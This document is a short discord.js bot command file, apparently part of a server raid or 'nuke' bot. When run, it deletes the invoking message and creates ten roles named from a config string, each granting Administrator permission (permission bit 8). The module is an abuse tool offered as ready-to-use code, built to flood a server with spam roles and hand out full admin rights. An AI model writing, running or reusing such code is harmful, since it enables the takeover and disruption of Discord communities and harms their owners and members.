const Discord = require("discord.js");
const config = require("../../util/config.json")

module.exports.run = async (bot, message, args) => { 
   message.delete()
   for (pas = 0; pas < 10; pas++) {

    await message.guild.createRole({
      name: config.mensg,
      color: "#0aff00",
      permissions: [8]
    });

    }
}
